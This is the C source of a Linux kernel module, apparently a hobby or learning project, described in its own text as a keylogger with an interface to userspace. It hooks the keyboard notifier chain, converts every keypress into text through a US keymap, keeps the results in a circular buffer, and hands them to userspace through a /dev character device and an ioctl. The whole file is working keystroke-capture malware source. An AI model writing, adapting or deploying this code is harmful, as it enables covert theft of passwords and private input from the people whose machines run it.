#include "key_logger.h"
#include <linux/keyboard.h>
#include <linux/slab.h>
#include <linux/input.h>
#include <linux/socket.h>

#define MAJOR_V 2
#define LOCKED 1
#define UNLOCKED 0 


static atomic_t file_state = ATOMIC_INIT(UNLOCKED); 
static struct class * cls;
// keyArray is circular buffer of pressed keys
static KeyEntry* keyArray = NULL;

static unsigned int keyArraySize = 2048;
// if arrayStart == arrayEnd array is empty
static unsigned int arrayStart = 0; //pointer to the first valid entry
static unsigned int arrayEnd = 0; //pointer past last valid entry
static unsigned long userBufferSize = 0;

static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

static unsigned long strlen_ker(const char* buff)
{
    unsigned long size = 0;
    while (buff[size] != '\0')
    {
        size++;
    }
    return size;
}

static int openDriver(struct inode* inode, struct file* file)
{
    if(atomic_cmpxchg(&file_state, UNLOCKED, LOCKED))
    {
        return -EBUSY;
    }

    try_module_get(THIS_MODULE);
    return 0;
}

int closeDriver(struct inode *inode, struct file *file)
{
    atomic_set(&file_state, UNLOCKED);
    module_put(THIS_MODULE); 
    return 0;
}

static void copy_input_to_userspace(__user char* bufer, unsigned long userBufferSize)
{
    int copiedSize = 0;
    static char null = '\0';
    unsigned long n;

    pr_info("On entry arrayStart = %d, arrayEnd = %d\n", arrayStart, arrayEnd);
    while (arrayStart != arrayEnd)
    {
        KeyEntry* currentEntry = &keyArray[arrayStart];
        unsigned long keyLen = strlen_ker(currentEntry->e_key);
        //leave one byte from user buffer for null char
        if(copiedSize + keyLen >= userBufferSize - 1)
        {
            n = copy_to_user(bufer + copiedSize, &null, 1);
            if( n != 0)
            {
                pr_alert("Copy to userspace error\n");
                return;
            }
            goto out;
        }

        n = copy_to_user(bufer + copiedSize, currentEntry->e_key, keyLen);
        if( n != 0)
        {
            pr_alert("Copy to userspace error\n");
            return;
        }
        arrayStart = (arrayStart + 1)%keyArraySize;
        copiedSize+= keyLen;
    }
    n = copy_to_user(bufer + copiedSize, &null, 1);
    if( n != 0)
    {
        pr_alert("Copy to userspace error\n");
        return;
    }
out:
    pr_info("In total %d bytes has been copied\n", copiedSize);
    pr_info("arrayStart = %d, arrayEnd = %d\n", arrayStart, arrayEnd);
    return;
}

long ioctl_handler(struct file *file, unsigned int op, unsigned long data)
{
    switch (op)
    {
    case SET_BUFF_SIZE:
        userBufferSize = data;
        pr_info("Userspace target buffer has been set to %lu", userBufferSize);
        break;
    case GET_READ_KEYS:
        copy_input_to_userspace((char*)data, userBufferSize);
        break;
    default:
        break;
    }

    return 0;
}

static int keylogger( struct notifier_block*, unsigned long action, void* data )
{
    struct keyboard_notifier_param* params = data;

    if(!(params->value > KEY_RESERVED && params->value <= KEY_PAUSE) || !params->down)
    {
        return NOTIFY_OK;
    }

    keyArray[arrayEnd].e_key = params->shift ? us_keymap[params->value][1] : us_keymap[params->value][0];
    arrayEnd = (arrayEnd + 1)%keyArraySize;
    if(arrayEnd == arrayStart)
    {
        arrayStart = (arrayStart + 1)%keyArraySize;
    }

    return NOTIFY_OK;
}

static struct notifier_block my_block =
{
    .notifier_call = keylogger
};

static struct file_operations ops =
{
    .open = openDriver,
    .unlocked_ioctl = ioctl_handler,
    .release = closeDriver
};

 
static int __init initModule(void) 
{ 

    keyArray = (KeyEntry*)kmalloc(sizeof(KeyEntry) * keyArraySize, GFP_KERNEL);

    register_chrdev(MAJOR_V, DRIVER_NAME, &ops);
    cls = class_create(THIS_MODULE, DRIVER_NAME);
    device_create(cls, NULL, MKDEV(MAJOR_V, 0 ), NULL, DRIVER_NAME);
    pr_info("Key logger created in /dev/%s\n", DRIVER_NAME); 

    register_keyboard_notifier(&my_block);
    return 0;
} 
 
static void __exit exitModule(void) 
{ 
    kfree(keyArray);
    keyArray = NULL;

    device_destroy(cls,  MKDEV(MAJOR_V, 0 ));
    class_destroy(cls); 
    
    /* Unregister the device */ 
    unregister_chrdev(MAJOR_V, DRIVER_NAME); 
    unregister_keyboard_notifier( &my_block);
    pr_info("Key logger has been succesfully removed\n");
} 
 
module_init(initModule); 
module_exit(exitModule); 
 
MODULE_LICENSE("GPL"); 
MODULE_DESCRIPTION("keylogger with interface to userspace");
